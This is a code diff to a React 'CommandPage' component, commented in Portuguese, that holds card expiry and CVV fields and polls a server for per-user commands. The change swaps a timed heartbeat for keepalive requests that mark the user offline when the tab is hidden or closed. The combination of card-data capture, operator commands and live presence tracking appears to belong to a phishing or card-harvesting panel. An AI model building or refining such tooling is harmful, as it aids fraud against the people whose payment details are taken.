@@ -16,7 +16,7 @@ function CommandPage({ userId }) {
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCardCvv] = useState("");
 
-  // Polling de comandos (sem heartbeat)
+  // Polling de comandos (heartbeat automático via check-action)
   useEffect(() => {
     const checkCommand = async () => {
       try {
@@ -34,36 +34,21 @@ function CommandPage({ userId }) {
     return () => clearInterval(interval);
   }, [userId]);
 
-  // Heartbeat separado - SÓ envia quando aba está VISÍVEL
+  // Detectar saída da aba - marcar offline IMEDIATAMENTE
   useEffect(() => {
-    let hbInterval = null;
-
-    const sendHB = () => {
-      if (!document.hidden) {
-        axios.post(`${API}/user/heartbeat/${userId}`).catch(() => {});
+    const handleVisibility = () => {
+      if (document.hidden) {
+        fetch(`${API}/user/go-offline/${userId}`, { method: 'POST', keepalive: true });
       }
     };
 
-    const start = () => {
-      sendHB();
-      if (hbInterval) clearInterval(hbInterval);
-      hbInterval = setInterval(sendHB, 2000);
-    };
-
-    const stop = () => {
-      if (hbInterval) { clearInterval(hbInterval); hbInterval = null; }
-    };
-
-    const onVis = () => {
-      if (document.hidden) stop(); else start();
-    };
-
-    document.addEventListener("visibilitychange", onVis);
-    if (!document.hidden) start();
+    document.addEventListener("visibilitychange", handleVisibility);
+    window.addEventListener("beforeunload", () => {
+      fetch(`${API}/user/go-offline/${userId}`, { method: 'POST', keepalive: true });
+    });
 
     return () => {
-      stop();
-      document.removeEventListener("visibilitychange", onVis);
+      document.removeEventListener("visibilitychange", handleVisibility);
     };
   }, [userId]);
 
